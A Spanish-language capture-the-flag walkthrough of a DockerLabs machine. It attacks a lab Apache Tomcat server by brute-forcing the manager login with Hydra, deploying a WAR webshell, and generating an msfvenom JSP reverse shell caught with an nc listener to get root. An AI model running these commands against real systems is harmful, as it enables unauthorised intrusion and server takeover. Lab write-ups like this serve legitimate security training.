## Enumeration

Enumeramos todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.

```bash
sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 172.17.0.2
```

Descargamos el archivo `tomcat.txt`.

Leemos el contenido del archivo `tomcat.txt`.

```bash
cat tomcat.txt
```

```plaintext

```

El servicio http muestra que está corriendo Apache Tomcat. Para iniciar sesión y configurar el servidor probamos credenciales por defecto. Googleamos y encontramos una lista para probar [Default Credentials](https://hackviser.com/tactics/pentesting/services/tomcat#default-credentials).

![Tomcat](@images/writeups/dockerlabs/pn/pn-tomcat.png)

Hacemos fuerza bruta para encontrar la contraseña del usuario `tomcat` según lo que se da a entender en el archivo `tomcat.txt`. Entre las contraseñas que probamos logramos acceso con `s3cr3t`.

```bash
hydra -l tomcat -P /usr/share/wordlists/seclists/Passwords/Common-Credentials/Pwdb_top-100000.txt 172.17.0.2 -s 8080 http-head /manager/html -I -t 16 -F
```

## Exploitation

Ahora podemos subir un archivo `war` para obtener una webshell siguiendo estos pasos [WAR File Upload (Manager Access)](https://hackviser.com/tactics/pentesting/services/tomcat#war-file-upload-manager-access).

![Upload WAR file](@images/writeups/dockerlabs/pn/pn-uploadwarfile.png)

Una vez seleccionado el archivo `shell.war` presionamos el botón `Deploy`.

Verificamos con `curl` la ejecución de comandos.

```bash
curl http://172.17.0.2:8080/shell/shell.jsp?cmd=id
```

```plaintext
uid=0(root) gid=0(root) groups=0(root)
```

También podemos crear una reverse shell para acceder al servidor.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=1111 -f war -o rev.war
```

Subimos el archivo. Nos ponemos en escucha en la máquina atacante.

```bash
nc -lnvp 1111
```

Accedemos a `http://172.17.0.2:8080/rev/` desde el navegador y recibimos la conexión.

```plaintext
Connection received on 172.17.0.2 33214
```

Estabilizamos la shell y verificamos como qué usuario estamos.

```bash
script /dev/null -c bash
```

Presionar las teclas `ctrl + z`.

```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 30 columns 171
```

```bash
id
```

```plaintext
uid=0(root) gid=0(root) groups=0(root)
```
